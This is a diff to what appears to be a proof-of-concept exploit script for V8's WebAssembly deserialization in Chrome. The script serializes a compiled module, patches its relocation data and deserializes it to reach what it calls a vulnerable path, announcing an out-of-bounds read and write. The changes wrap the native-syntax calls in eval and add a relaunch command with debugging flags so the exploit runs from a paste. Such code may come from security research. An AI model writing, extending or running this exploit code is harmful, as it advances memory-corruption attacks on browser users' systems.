@@ -37,9 +37,19 @@ for (let i = 0; i < 200000; i++) inst.exports.f();
 console.log('    f() = ' + inst.exports.f());
 
 // ── Step 2: Serialize ─────────────────────────────────────────────────────────
-// %SerializeWasmModule used directly (no eval wrapper needed — browser already
-// has --allow-natives-syntax applied to the whole V8 context).
-const blob = %SerializeWasmModule(mod);
+// eval() defers parsing of % to runtime so the block pastes without SyntaxError
+// even when --allow-natives-syntax is not set.
+let blob;
+try {
+  blob = eval('%SerializeWasmModule(mod)');
+} catch (e) {
+  if (e instanceof SyntaxError) {
+    console.error('[!] %SerializeWasmModule requires --allow-natives-syntax.');
+    console.error('    Relaunch Chrome: google-chrome --js-flags="--allow-natives-syntax --no-liftoff"');
+    return;
+  }
+  throw e;
+}
 if (!blob) { console.error('[!] %SerializeWasmModule returned null'); return; }
 const bv = new Uint8Array(blob);
 const dv = new DataView(blob);
@@ -109,7 +119,7 @@ if (new_reloc.length !== reloc_size) {
 // ── Step 5: Trigger deserialization ───────────────────────────────────────────
 console.log('[5] %DeserializeWasmModule → triggers vulnerable path...');
 try {
-  const poisoned_mod = %DeserializeWasmModule(patched, WASM);
+  const poisoned_mod = eval('%DeserializeWasmModule(patched, WASM)');
   if (poisoned_mod) {
     console.log('%c╔══════════════════════════════════════════════════════════════╗', 'color:red;font-weight:bold');
     console.log('%c║  [RELEASE BUILD] OOB READ + WRITE EXECUTED                  ║', 'color:red;font-weight:bold');
